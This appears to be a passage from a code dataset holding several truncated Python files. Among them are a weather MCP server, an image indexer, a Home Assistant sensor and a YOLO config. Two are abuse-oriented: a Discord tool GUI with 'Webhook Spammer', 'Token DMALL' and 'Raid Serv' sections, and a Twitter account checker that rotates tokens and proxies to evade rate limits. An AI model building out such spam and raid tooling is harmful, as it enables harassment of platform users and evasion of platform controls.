sheet.append([\"URL\", \"Status\"])\r\n\r\n    for url, status in results.items():\r\n        sheet.append([url, status])\r\n\r\n    workbook.save(output_file)\r\n    messagebox.showinfo(\"Information\", f\"Results saved to {output_file}\")\r\n\r\n\r\ndef create_gui(settings):\r\n    \"\"\"Create the GUI for the script.\"\"\"\r\n    window = tk.Tk()\r\n    window.title(\"Google Index Checker\")\r\n\r\n    # User-Agent\r\n    tk.Label(window, text=\"User Agent:\").grid(row=0, column=0, sticky=\"w\")\r\n    user_agent_entry = tk.Entry(window, width=50)\r\n    user_agent_entry.insert(0, settings['user_agent'])\r\n    user_agent_entry.grid(row=0, column=1)\r\n\r\n    # Add a blue clickable link for User-Agent help\r\n    link_label = tk.Label(window, text=\"Find your user agent at https://www.whatsmyua.info\", fg=\"blue\", cursor=\"hand2\")\r\n    link_label.grid(row=1, column=1, sticky=\"w\")\r\n    link_label.bind(\"<Button-1>\", lambda e: webbrowser.open(\"https://www.whatsmyua.info\"))\r\n\r\n    # URLs\r\n    tk.Label(window, text=\"URLs (one per line, up to 1000):\").grid(row=2, column=0, sticky=\"nw\")\r\n    urls_text = tk.Text(window, height=15, width=50)\r\n    urls_text.insert('1.0'",
    "import customtkinter as ctk\r\nimport tkinter as tk\r\nfrom tkinter import Label, messagebox, filedialog\r\nfrom PIL import Image, ImageTk, ImageSequence\r\nfrom discord.ext import commands\r\nimport discord\r\nimport time\r\nimport os\r\nimport requests\r\nimport threading\r\nimport webbrowser\r\nimport subprocess\r\n\r\n\r\nclass MainApp:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        self.master.title(\"Crystal Interface\")\r\n        self.master.geometry(\"1400x800\")\r\n\r\n        ctk.set_appearance_mode(\"system\")  \r\n        ctk.set_default_color_theme(\"blue\")  \r\n\r\n        self.set_window_icon(\"favicon.ico\")\r\n\r\n        self.frame_left = ctk.CTkScrollableFrame(master, width=250, corner_radius=10)\r\n        self.frame_left.grid(row=0, column=0, padx=30, pady=20, sticky=\"nsw\")\r\n\r\n        # Right frame (Content)\r\n        self.frame_right = ctk.CTkFrame(master, corner_radius=10)\r\n        self.frame_right.grid(row=0, column=1, padx=30, pady=20, sticky=\"nsew\")\r\n\r\n        # Theme switcher\r\n        self.theme_switch = ctk.CTkSwitch(self.frame_left, text=\"Light Mode\", command=self.switch_theme, onvalue=1, offvalue=0, progress_color=\"#7289DA\")\r\n        self.theme_switch.pack(pady=20)\r\n\r\n        # HOME CRYSTAL INTERFACE\r\n        self.crystal_button = ctk.CTkButton(self.frame_left, text=\"Crystal Interface\", command=self.show_crystal_frame, fg_color=\"#FF4D4D\", hover_color=\"#FF6666\", corner_radius=8)\r\n        self.crystal_button.pack(pady=10, padx=15)\r\n\r\n        # Webhook Spammer\r\n        self.webhook_button = ctk.CTkButton(self.frame_left, text=\"Webhook Spammer\", command=self.show_webhook_frame, fg_color=\"#FF4D4D\", hover_color=\"#FF6666\", corner_radius=8)\r\n        self.webhook_button.pack(pady=10, padx=15)\r\n\r\n        # Token DMALL\r\n        self.token_button = ctk.CTkButton(self.frame_left, text=\"Token DMALL\", command=self.show_token_frame, fg_color=\"#FF4D4D\", hover_color=\"#FF6666\", corner_radius=8)\r\n        self.token_button.pack(pady=10, padx=15)\r\n\r\n        # RAID SERV\r\n        self.raidserv_button = ctk.CTkButton(self.frame_left, text=\"Raid Serv\", command=self.show_raidserv_frame, fg_color=\"#FF4D4D\", hover_color=\"#FF6666\", corner_radius=8)\r\n        self.raidserv_button.pack(pady=10, padx=15)\r\n\r\n        # --- Sections --- \r\n        self.crystal_frame = CrystalFrame(self.frame_right)\r\n        self.webhook_frame = WebhookFrame(self.frame_right)\r\n        self.token_frame = TokenFrame(self.frame_right)\r\n        self.raidserv_frame = RaidservFrame(self.frame_right)\r\n        self.show_crystal_frame()\r\n\r\n    def show_crystal_frame(self):\r\n        \"\"\"Show the Crystal Interface frame.\"\"\"\r\n        self.crystal_frame.pack(fill=\"both\", expand=True)\r\n        self.webhook_frame.pack_forget()\r\n        self.token_frame.pack_forget()\r\n        self.raidserv_frame.pack_forget()\r\n\r\n    def show_webhook_frame(self):\r\n        \"\"\"Show the Webhook Spammer frame.\"\"\"\r\n        self.crystal_frame.pack_forget()\r\n        self.webhook_frame.pack(fill=\"both\", expand=True)\r\n        self.token_frame.pack_forget()\r\n        self.raidserv_frame.pack_forget()\r\n\r\n    def show_token_frame(self):\r\n        \"\"\"Show the Token DMALL frame.\"\"\"\r\n        self.crystal_frame.pack_forget()\r\n        self.webhook_frame.pack_forget()\r\n        self.token_frame.pack(fill=\"both\", expand=True)\r\n        self.raidserv_frame.pack_forget()\r\n\r\n    def show_raidserv_frame(self):\r\n        \"\"\"Show the Raid Serv frame.\"\"\"\r\n        self.crystal_frame.pack_forget()\r\n        self.webhook_frame.pack_forget()\r\n        self.token_frame.pack_forget()\r\n        self.raidserv_frame.pack(fill=\"both\", expand=True)\r\n\r\n    def switch_theme(self):\r\n        if ctk.get_appearance_mode() == \"Dark\":\r\n            ctk.set_appearance_mode(\"Light\")\r\n        else:\r\n            ctk.set_appearance_mode(\"Dark\")\r\n\r\n    def set_window_icon(self, icon_path):\r\n        if os.path.exists(icon_path):\r\n            self.master.iconbitmap(icon_path)\r\n        else:\r\n            print(f\"Icon file not found: {icon_path}\")\r\n\r\n# --- Classe pour la section HOME CRYSTAL---\r\nclass CrystalFrame(ctk.CTkFrame):\r\n    def __init__(self, master):\r\n        super().__init__(master)\r\n        self.configure(bg_color=\"#23272A\")  \r\n\r\n        self.gradient_canvas = ctk.CTkCanvas(self, bg=\"#2C2F33\", highlightthickness=0)\r\n        self.gradient_canvas.pack(fill=\"both\", expand=True)\r\n\r\n        self.image_canvas = ctk.CTkCanvas(self.gradient_canvas, bg=\"#2C2F33\", highlightthickness=0)\r\n        self.image_canvas.pack(pady=0) \r\n\r\n        self.load_image(r\"C:\\Users\\flipp\\Desktop\\crystal\\banniere.jpg\")\r\n\r\n        self.border_frame = ctk.CTkFrame(self.gradient_canvas, bg_color=\"#2C2F33\", border_width=5, border_color=\"#c00404\")\r\n        self.border_frame.pack(padx=10, pady=10, fill=\"both\", expand=True)  \r\n\r\n        self.discord_button = ctk.CTkButton(\r\n            self.border_frame,\r\n            text=\"Join Discord Server\",\r\n            command=self.open_discord_server,\r\n            fg_color=\"#7289DA\",\r\n            hover_color=\"#99A8F7\",\r\n            corner_radi",
    "import os\nimport json\nfrom pathlib import Path\nfrom typing import Dict, Optional\nfrom fastmcp import FastMCP\nfrom dotenv import load_dotenv\nfrom aiohttp import ClientSession\n\n# Load environment variables\nload_dotenv()\n\n# Initialize FastMCP\nmcp = FastMCP(\"mcp-weather\")\n\n# Cache configuration\nCACHE_DIR = Path.home() / \".cache\" / \"weather\"\nLOCATION_CACHE_FILE = CACHE_DIR / \"location_cache.json\"\n\ndef get_cached_location_key(location: str) -> Optional[str]:\n    \"\"\"Get location key from cache.\"\"\"\n    if not LOCATION_CACHE_FILE.exists():\n        return None\n    \n    try:\n        with open(LOCATION_CACHE_FILE, \"r\") as f:\n            cache = json.load(f)\n            return cache.get(location)\n    except (json.JSONDecodeError, FileNotFoundError):\n        return None\n\ndef cache_location_key(location: str, location_key: str):\n    \"\"\"Cache location key for future use.\"\"\"\n    CACHE_DIR.mkdir(parents=True, exist_ok=True)\n    \n    try:\n        if LOCATION_CACHE_FILE.exists():\n            with open(LOCATION_CACHE_FILE, \"r\") as f:\n                cache = json.load(f)\n        else:\n            cache = {}\n        \n        cache[location] = location_key\n        \n        with open(LOCATION_CACHE_FILE, \"w\") as f:\n            json.dump(cache, f, indent=2)\n    except Exception as e:\n        print(f\"Warning: Failed to cache location key: {e}\")\n\n@mcp.tool()\nasync def get_hourly_weather(location: str) -> Dict:\n    \"\"\"Get hourly weather forecast for a location.\"\"\"\n    api_key = os.getenv(\"ACCUWEATHER_API_KEY\")\n    base_url = \"http://dataservice.accuweather.com\"\n    \n    # Try to get location key from cache first\n    location_key = get_cached_location_key(location)\n    \n    async with ClientSession() as session:\n        if not location_key:\n            location_search_url = f\"{base_url}/locations/v1/cities/search\"\n            params = {\n                \"apikey\": api_key,\n                \"q\": location,\n            }\n            async with session.get(location_search_url, params=params) as response:\n                locations = await response.json()\n                if response.status != 200:\n                    raise Exception(f\"Error fetching location data: {response.status}, {locations}\")\n                if not locations or len(locations) == 0:\n                    raise Exception(\"Location not found\")\n            \n            location_key = locations[0][\"Key\"]\n            # Cache the location key for future use\n            cache_location_key(location, location_key)\n        \n        # Get current conditions\n        current_conditions_url = f\"{base_url}/currentconditions/v1/{location_key}\"\n        params = {\n            \"apikey\": api_key,\n        }\n        async with session.get(current_conditions_url, params=params) as response:\n            current_conditions = await response.json()\n            \n        # Get hourly forecast\n        forecast_url = f\"{base_url}/forecasts/v1/hourly/12hour/{location_key}\"\n        params = {\n            \"apikey\": api_key,\n            \"metric\": \"true\",\n        }\n        async with session.get(forecast_url, params=params) as response:\n            forecast = await response.json()\n        \n        # Format response\n        hourly_data = []\n        for i, hour in enumerate(forecast, 1):\n            hourly_data.append({\n                \"relative_time\": f\"+{i} hour{'s' if i > 1 else ''}\",\n                \"temperature\": {\n                    \"value\": hour[\"Temperature\"][\"Value\"],\n                    \"unit\": hour[\"Temperature\"][\"Unit\"]\n                },\n                \"weather_text\": hour[\"IconPhrase\"],\n                \"precipitation_probability\": hour[\"PrecipitationProbability\"],\n                \"precipitation_type\": hour.get(\"PrecipitationType\"),\n                \"precipitation_intensity\": hour.get(\"PrecipitationIntensity\"),\n            })\n        \n        # Format current conditions\n        if current_conditions and len(current_conditions) > 0:\n            current = current_conditions[0]\n            current_data = {\n                \"temperature\": {\n                    \"value\": current[\"Temperature\"][\"Metric\"][\"Value\"],\n                    \"unit\": current[\"Temperature\"][\"Metric\"][\"Unit\"]\n                },\n                \"weather_text\": current[\"WeatherText\"],\n                \"relative_humidity\": current.get(\"RelativeHumidity\"),\n                \"precipitation\": current.get(\"HasPrecipitation\", False),\n                \"observation_time\": current[\"LocalObservationDateTime\"]\n            }\n        else:\n            current_data = \"No current conditions available\"\n        \n        return {\n            \"location\": locations[0][\"LocalizedName\"],\n            \"location_key\": location_key,\n            \"country\": locations[0][\"Country\"][\"LocalizedName\"],\n            \"current_conditions\": current_data,\n            \"hourly_forecast\": hourly_data\n        } \n",
    "# ------------------------------------------------------------------------\n# GME Search\n# Copyright (c) 2025 Wei Li. All Rights Reserved.\n# Licensed under the MIT License [see LICENSE for details]\n# ------------------------------------------------------------------------\n\nimport glob\nimport torch\nimport faiss\nimport argparse\nimport numpy as np\nfrom gme_model import GmeQwen2VL\n\ndef extract_image_embeddings(vlm, image_paths, batch_size=2):\n    all_embeddings = []\n    for i in range(0, len(image_paths), batch_size):\n        batch_images = image_paths[i:i + batch_size]\n        try:\n            batch_embeddings = vlm.get_image_embeddings(images=batch_images)\n            all_embeddings.append(batch_embeddings)\n        except Exception as e:\n            print(f\"Error processing batch starting at index {i}: {e}\")\n    return torch.cat(all_embeddings, dim=0) if all_embeddings else torch.tensor([])\n\ndef load_existing_data(embeddings_file, index_file, image_paths_file):\n    try:\n        embeddings = np.load(embeddings_file)\n        index = faiss.read_index(index_file)\n        with open(image_paths_file, 'r') as f:\n            image_paths = [line.strip() for line in f.readlines()]\n        return embeddings, index, image_paths\n    except Exception:\n        return None, None, []\n\ndef save_updated_data(embeddings, index, image_paths, embeddings_file, index_file, image_paths_file):\n    np.save(embeddings_file, embeddings)\n    faiss.write_index(index, index_file)\n    with open(image_paths_file, 'w') as f:\n        for img_path in image_paths:\n            f.write(img_path + '\\n')\n\ndef main(args):\n    gme = GmeQwen2VL(args.model_path)\n\n    existing_embeddings, existing_index, existing_image_paths = load_existing_data(\n        args.embeddings_output, args.index_output, args.image_paths_output\n    )\n\n    # Extract embeddings for new images if needed\n    new_image_paths = glob.glob(f\"{args.image_dir}/**/*\", recursive=True)\n    new_image_paths = [img for img in new_image_paths if img not in existing_image_paths]\n    if not new_image_paths:\n        print(\"No new images to index.\")\n        return\n\n    new_image_embeddings = extract_image_embeddings(gme, new_image_paths, batch_size=args.batch_size)\n    if new_image_embeddings.nelement() == 0:\n        print(\"No embeddings extracted for new images.\")\n        return\n\n    # Convert embeddings to float32 numpy array\n    new_image_embeddings_np = new_image_embeddings.cpu().numpy().astype('float32')\n\n    # Update FAISS index and embeddings\n    if existing_index is not None:\n        existing_index.add(new_image_embeddings_np)\n        updated_embeddings = np.vstack([existing_embeddings, new_image_embeddings_np])\n        updated_image_paths = existing_image_paths + new_image_paths\n    else:\n        # If no existing index, create a new one\n        dimension = new_image_embeddings_np.shape[1]\n        existing_index = faiss.IndexFlatIP(dimension)\n        existing_index.add(new_image_embeddings_np)\n        updated_embeddings = new_image_embeddings_np\n        updated_image_paths = new_image_paths\n\n    # Save updated data\n    save_updated_data(\n        updated_embeddings, existing_index, updated_image_paths,\n        args.embeddings_output, args.index_output, args.image_paths_output\n    )\n    print(f\"Index updated with {len(new_image_paths)} new images.\")\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='Incrementally update FAISS index for image embeddings.')\n    parser.add_argument('--model_path', type=str, default='./models/gme-Qwen2-VL-2B-Instruct',\n                        help='Path to the GmeQwen2VL model.')\n    parser.add_argument('--image_dir', type=str, default='./gallery',\n                        help='Path to the directory containing new images.')\n    parser.add_argument('--batch_size', type=int, default=2,\n                        help='Batch size for embedding extraction.')\n    parser.add_argument('--embeddings_output', type=str, default='data_img_ebd.npy',\n                        help='Output file for saving image embeddings.')\n    parser.add_argument('--index_output', type=str, default='data_faiss_idx.index',\n                        help='Output file for saving FAISS index.')\n    parser.add_argument('--image_paths_output', type=str, default='data_img_path.txt',\n                        help='Output file for saving image paths.')\n    args = parser.parse_args()\n    main(args)",
    "import tweepy\r\nimport json\r\nimport asyncio\r\nimport aiohttp\r\nfrom aiofiles import open as aio_open\r\n\r\n# \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438\r\nPROXY_FILE = \"proxies.txt\"\r\nTOKEN_FILE = \"tokens.txt\"\r\nLOG_FILE = \"checker.log\"\r\nACCOUNTS_FILE = \"accounts_to_check.txt\"\r\n\r\nasync def load_file(filename):\r\n    \"\"\"\u0417\u0430\u0433\u0440\u0443\u0436\u0430\u0435\u0442 \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\"\"\"\r\n    async with aio_open(filename, 'r', encoding='utf-8') as file:\r\n        return await file.read()\r\n\r\ndef authenticate_twitter(api_key, api_secret, access_token, access_token_secret, proxy=None):\r\n    \"\"\"\u0410\u0443\u0442\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u044f \u0432 API Twitter \u0441 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435\u043c \u043f\u0440\u043e\u043a\u0441\u0438\"\"\"\r\n    auth = tweepy.OAuthHandler(api_key, api_secret, proxy=proxy)\r\n    auth.set_access_token(access_token, access_token_secret)\r\n    return tweepy.API(auth)\r\n\r\nasync def check_account(api, account, session, proxy):\r\n    \"\"\"\u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 \u0432\u0430\u043b\u0438\u0434\u043d\u043e\u0441\u0442\u044c \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430 Twitter\"\"\"\r\n    try:\r\n        user = api.get_user(screen_name=account)\r\n        result = f\"\u0410\u043a\u043a\u0430\u0443\u043d\u0442 @{account} \u0432\u0430\u043b\u0438\u0434\u0435\u043d. \u0418\u043c\u044f: {user.name}\\n\"\r\n    except tweepy.TweepError as e:\r\n        result = f\"\u0410\u043a\u043a\u0430\u0443\u043d\u0442 @{account} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u0438\u043b\u0438 \u043e\u0448\u0438\u0431\u043a\u0430: {e}\\n\"\r\n    await log_result(result)\r\n    return result\r\n\r\nasync def log_result(result):\r\n    \"\"\"\u0417\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u0442 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0432 \u043b\u043e\u0433\"\"\"\r\n    async with aio_open(LOG_FILE, 'a', encoding='utf-8') as log_file:\r\n        await log_file.write(result)\r\n\r\nasync def main():\r\n    # \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0434\u0430\u043d\u043d\u044b\u0445\r\n    tokens = json.loads(await load_file(TOKEN_FILE))\r\n    proxies = (await load_file(PROXY_FILE)).splitlines()\r\n    accounts = (await load_file(ACCOUNTS_FILE)).splitlines()\r\n\r\n    # \u041f\u0435\u0440\u0435\u0431\u043e\u0440 \u0442\u043e\u043a\u0435\u043d\u043e\u0432 \u0438 \u043f\u0440\u043e\u043a\u0441\u0438\r\n    async with aiohttp.ClientSession() as session:\r\n        for token in tokens:\r\n            for proxy in proxies:\r\n                print(f\"\u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u0441 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435\u043c \u0442\u043e\u043a\u0435\u043d\u0430: {token['API_KEY']} \u0438 \u043f\u0440\u043e\u043a\u0441\u0438: {proxy}\")\r\n                try:\r\n                    api = authenticate_twitter(\r\n                        token[\"API_KEY\"],\r\n                        token[\"API_SECRET\"],\r\n                        token[\"ACCESS_TOKEN\"],\r\n                        token[\"ACCESS_TOKEN_SECRET\"],\r\n                        proxy=proxy\r\n                    )\r\n                    # \u0410\u0441\u0438\u043d\u0445\u0440\u043e\u043d\u043d\u0430\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u043e\u0432\r\n                    tasks = [check_account(api, account, session, proxy) for account in accounts]\r\n                    results = await asyncio.gather(*tasks)\r\n                    print(\"\\n\".join(results))\r\n                    return  # \u0415\u0441\u043b\u0438 \u0443\u0441\u043f\u0435\u0448\u043d\u043e, \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u043c \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0443\r\n                except tweepy.RateLimitError:\r\n                    print(\"\u041b\u0438\u043c\u0438\u0442 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u0438\u0441\u0447\u0435\u0440\u043f\u0430\u043d. \u041f\u0440\u043e\u0431\u0443\u0435\u043c \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u043f\u0440\u043e\u043a\u0441\u0438.\")\r\n                except Exception as e:\r\n                    print(f\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0441 \u0442\u043e\u043a\u0435\u043d\u043e\u043c \u0438\u043b\u0438 \u043f\u0440\u043e\u043a\u0441\u0438: {e}\")\r\n    print(\"\\n\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0430.\")\r\n\r\nif __name__ == \"__main__\":\r\n    asyncio.run(main())\r\n",
    "\"\"\"Senzor pentru integrarea Curs valutar BNR.\"\"\"\nimport logging\nfrom homeassistant.components.sensor import SensorEntity\nfrom homeassistant.helpers.update_coordinator import CoordinatorEntity\nfrom homeassistant.const import ATTR_ATTRIBUTION\nfrom homeassistant.helpers.device_registry import DeviceEntryType\n\nfrom .const import DOMAIN\n\n_LOGGER = logging.getLogger(__name__)\n\nATTRIBUTION = \"Date furnizate de BNR prin www.syspro.ro\"\n\n\nasync def async_setup_entry(hass, entry, async_add_entities):\n    \"\"\"Configureaz\u0103 senzorii pe baza unei intr\u0103ri din Config Flow.\"\"\"\n    _LOGGER.debug(\"Configurare senzori pentru integrarea Curs valutar BNR.\")\n    coordinator = hass.data[DOMAIN][entry.entry_id]\n\n    # Lista senzorilor disponibili\n    sensors = [\n        BnrRatesEur(coordinator),\n        BnrRatesUsd(coordinator),\n        BnrRatesChf(coordinator),\n        BnrRatesGbp(coordinator),\n        BnrFxRatesEur(coordinator),\n        BnrFxRatesUsd(coordinator),\n        BnrFxRatesChf(coordinator),\n        BnrFxRatesGbp(coordinator),\n        DobandaRobor(coordinator),\n        DobandaEuribor(coordinator),\n        IRCCzilnic(coordinator),\n        IRCCTrimestrial(coordinator),\n    ]\n\n    # Adaug\u0103 to\u021bi senzorii din list\u0103\n    async_add_entities(sensors, True)\n\n    # Logare dinamic\u0103\n    sensor_names = [sensor.name for sensor in sensors]\n    _LOGGER.debug(\"Senzorii ad\u0103uga\u021bi pentru integrarea Curs valutar BNR: %s\", sensor_names)\n\n\nclass BaseBnrSensor(CoordinatorEntity, SensorEntity):\n    \"\"\"Clasa de baz\u0103 pentru senzorii cursului valutar BNR.\"\"\"\n\n    def __init__(self, coordinator, name, unique_id, entity_id, icon):\n        \"\"\"Ini\u021bializeaz\u0103 senzorul.\"\"\"\n        super().__init__(coordinator)\n        self._attr_name = name\n        self._attr_unique_id = unique_id\n        self._attr_entity_id = entity_id\n        self._attr_icon = icon\n        _LOGGER.debug(\"Senzorul %s a fost ini\u021bializat.\", self._attr_name)\n\n    @property\n    def native_value(self):\n        \"\"\"Returneaz\u0103 valoarea principal\u0103 a senzorului.\"\"\"\n        raise NotImplementedError\n\n    @property\n    def extra_state_attributes(self):\n        \"\"\"Returneaz\u0103 atributele suplimentare.\"\"\"\n        raise NotImplementedError\n\n    @property\n    def icon(self):\n        \"\"\"Returneaz\u0103 pictograma senzorului.\"\"\"\n        return self._attr_icon\n\n    @property\n    def device_info(self):\n        \"\"\"Informa\u021bii despre dispozitiv pentru integrare.\"\"\"\n        return {\n            \"identifiers\": {(DOMAIN, \"cursbnr\")},\n            \"name\": \"Curs valutar BNR\",\n            \"manufacturer\": \"Ciprian Nicolae (cnecrea)\",\n            \"model\": \"Curs valutar BNR\",\n            \"entry_type\": DeviceEntryType.SERVICE,\n        }\n\n\nclass BnrRatesEur(BaseBnrSensor):\n    \"\"\"Clasa senzorului pentru rata EUR oferit\u0103 de BNR.\"\"\"\n\n    def __init__(self, coordinator):\n        super().__init__(\n            coordinator,\n            name=\"Curs valutar RON \u2192 EUR\",\n            unique_id=f\"{DOMAIN}_bnr_rates_ron_eur\",\n            entity_id=\"sensor.bnr_rates_ron_eur\",\n            icon=\"mdi:currency-eur\",\n        )\n\n    @property\n    def native_value(self):\n        \"\"\"Returneaz\u0103 valoarea principal\u0103 a senzorului.\"\"\"\n        json_data = self.coordinator.data\n        curs_actual = json_data.get(\"curs_valutar\", {}).get(\"actual\", [])\n        valoare_eur = next((item[\"rate\"] for item in curs_actual if item[\"currency\"] == \"EUR\"), None)\n        if valoare_eur is not None:\n            valoare = float(valoare_eur)\n            _LOGGER.debug(\"Valoarea principal\u0103 a senzorului %s este: %.4f\", self._attr_name, valoare)\n            return valoare\n        _LOGGER.error(\"Nu am g\u0103sit rata EUR \u00een JSON pentru senzorul %s.\", self._attr_name)\n        return None\n\n    @property\n    def extra_state_attributes(self):\n        \"\"\"Returneaz\u0103 atributele suplimentare.\"\"\"\n        json_data = self.coordinator.data\n        curs_actual = json_data.get(\"curs_valutar\", {}).get(\"actual\", [])\n        curs_anterior = json_data.get(\"curs_valutar\", {}).get(\"anterior\", [])\n        eur_actual = next((item for item in curs_actual if item[\"currency\"] == \"EUR\"), {})\n        eur_anterior = next((item for item in curs_anterior if item[\"currency\"] == \"EUR\"), {})\n\n        valoare_curenta = float(eur_actual.get(\"rate\", 0))\n        valoare_anterioara = float(eur_anterior.get(\"rate\", 0))\n        schimbare = valoare_curenta - valoare_anterioara\n        schimbare_procentual\u0103 = (schimbare / valoare_anterioara * 100) if valoare_anterioara else 0\n\n        attributes = {\n            \"Valoare curent\u0103\": \"%.4f\" % valoare_curenta,\n            \"Valoare anterioar\u0103\": \"%.4f\" % valoare_anterioara,\n            \"Schimbare\": \"%.4f\" % schimbare,\n            \"Schimbare procentual\u0103\": \"%.2f\" % schimbare_procentual\u0103,\n            ATTR_ATTRIBUTION: ATTRIBUTION,\n        }\n\n        _LOGGER.debug(\"Atributele suplimentare pentru senzorul %s: %s\", self._attr_name, attributes)\n        return attributes\n\n\nclass BnrRatesUsd(BaseBnrSensor):\n    \"\"\"Clasa senzorului pentru rata USD oferit\u0103 de BNR.\"\"\"\n\n    def __init__(self, coo",
    "import os\n\n# Base Path\nbase_path = os.path.dirname(__file__)\n\n## Assets Folder\nassets_folder = os.path.join(base_path, 'assets')\nlogo_path = os.path.join(assets_folder, 'logo_upd_and_ai.png')\nfastapi_path = os.path.join(assets_folder, 'fastapi-websockets.png')\n\n## Trained Model Paths\nmodel_base_path = os.path.join(base_path, 'trained models')\n\n## Validations Folder\nvalidations_image_folder = os.path.join(base_path, 'validations/images')\nvalidations_labels_folder = os.path.join(base_path, 'validations/labels')\n\n### Revision 0 Models\n### Model paths for detection\ndetection_models = [\n    os.path.join(model_base_path, \"yolo11n T.pt\"), # YOLO11N\n    # os.path.join(model_base_path, \"yolo11m T.pt\"), # YOLO11M\n    # os.path.join(model_base_path, \"yolo11x T.pt\"), # YOLO11X\n]\n\n### Model paths for segmentation\nsegmentation_models = [\n    os.path.join(model_base_path, \"yolo11n-seg T.pt\"), # YOLO11N-SEG\n    # os.path.join(model_base_path, \"yolo11m-seg T.pt\"), # YOLO11M-SEG\n    # os.path.join(model_base_path, \"yolo11x-seg T.pt\"), # YOLO11X-SEG\n    # os.path.join(model_base_path, \"yolo11x2-seg T.pt\"), # YOLO11X2-SEG\n]\n\n### Revision 1 Models\n# ### Model paths for detection\n# detection_models = [\n#     os.path.join(model_base_path, \"RTDTR-x T0.pt\"), # RTDTR-X\n#     os.path.join(model_base_path, \"yolo11x-640F T0.pt\"), # YOLO11X Pixel 640 - Freeze Backbone\n#     os.path.join(model_base_path, \"yolo11x-640NF T0.pt\"), # YOLO11X Pixel 640 - No Freeze Backbone\n#     os.path.join(model_base_path, \"yolo11x-1280F T0.pt\"), # YOLO11X Pixel 1280 - Freeze Backbone\n# ]\n\n# ### Model paths for segmentation\n# segmentation_models = [\n#     os.path.join(model_base_path, \"yolo11x-seg-640F T0.pt\"), # YOLO11X-SEG Pixel 640 - Freeze Backbone\n#     os.path.join(model_base_path, \"yolo11x-seg-640NF T0.pt\"), # YOLO11X-SEG Pixel 640 - No Freeze Backbone\n#     os.path.join(model_base_path, \"yolo11x-seg-1280F T0.pt\"), # YOLO11X-SEG Pixel 1280 - Freeze Backbone\n# ]\n\n## Results Folder\nresult_base_path = os.path.join(base_path, 'results')\ntraining_results_R0 = os.path.join(base_path, 'results/R0')\ntraining_results_R1 = os.path.join(base_path, 'results/R1')\n\n### csv Files\ndataset_count_path = os.path.join(result_base_path, 'dataset.csv')\ngeneral_param_path = os.path.join(result_base_path, 'general parameters.csv')\ntraining_path = os.path.join(result_base_path, 'training results.csv')\ntraining_path_1 = os.path.join(result_base_path, 'training results R1.csv')\napp_guide_path = os.path.join(result_base_path, 'app guide.csv')\n\n### Folder Paths for R0\n### YOLO11N \nyolo11n_path = os.path.join(training_results_R0, 'YOLO11N')\nyolo11n_loss_path = os.path.join(yolo11n_path, 'results.csv')\nyolo11n_conf_path = os.path.join(yolo11n_path, 'conf_matrix.png')\nyolo11n_val_path = os.path.join(yolo11n_path, 'val_sample.jpg')\n\n### YOLO11N-SEG \nyolo11ns_path = os.path.join(training_results_R0, 'YOLO11N SEG')\nyolo11ns_loss_path = os.path.join(yolo11ns_path, 'results.csv')\nyolo11ns_conf_path = os.path.join(yolo11ns_path, 'conf_matrix.png')\nyolo11ns_val_path = os.path.join(yolo11ns_path, 'val_sample.jpg')\n\n#### YOLO11M \nyolo11m_path = os.path.join(training_results_R0, 'YOLO11M')\nyolo11m_loss_path = os.path.join(yolo11m_path, 'results.csv')\nyolo11m_conf_path = os.path.join(yolo11m_path, 'conf_matrix.png')\nyolo11m_val_path = os.path.join(yolo11m_path, 'val_sample.jpg')\n\n### YOLO11M-SEG \nyolo11ms_path = os.path.join(training_results_R0, 'YOLO11M SEG')\nyolo11ms_loss_path = os.path.join(yolo11ms_path, 'results.csv')\nyolo11ms_conf_path = os.path.join(yolo11ms_path, 'conf_matrix.png')\nyolo11ms_val_path = os.path.join(yolo11ms_path, 'val_sample.jpg')\n\n#### YOLO11X\nyolo11x_path = os.path.join(training_results_R0, 'YOLO11X')\nyolo11x_loss_path = os.path.join(yolo11x_path, 'results.csv')\nyolo11x_conf_path = os.path.join(yolo11x_path, 'conf_matrix.png')\nyolo11x_val_path = os.path.join(yolo11x_path, 'val_sample.jpg')\n\n### YOLO11X-SEG \nyolo11xs_path = os.path.join(training_results_R0, 'YOLO11X SEG')\nyolo11xs_loss_path = os.path.join(yolo11xs_path, 'results.csv')\nyolo11xs_conf_path = os.path.join(yolo11xs_path, 'conf_matrix.png')\nyolo11xs_val_path = os.path.join(yolo11xs_path, 'val_sample.jpg')\n\n### Folder Paths for R1\n### RTDTR-X\nrtdtr_x_path = os.path.join(training_results_R1, 'RTDTR-X')\nrtdtr_x_loss_path = os.path.join(rtdtr_x_path, 'results.csv')\nrtdtr_x_conf_path = os.path.join(rtdtr_x_path, 'conf_matrix.png')\nrtdtr_x_val_path = os.path.join(rtdtr_x_path, 'val_sample.jpg')\n\n### YOLO11X-640F\nyolo11x_640F_path = os.path.join(training_results_R1, 'YOLO11X-640F')\nyolo11x_640F_loss_path = os.path.join(yolo11x_640F_path, 'results.csv')\nyolo11x_640F_conf_path = os.path.join(yolo11x_640F_path, 'conf_matrix.png')\nyolo11x_640F_val_path = os.path.join(yolo11x_640F_path, 'val_sample.jpg')\n\n### YOLO11X-640NF\nyolo11x_640NF_path = os.path.join(training_results_R1, 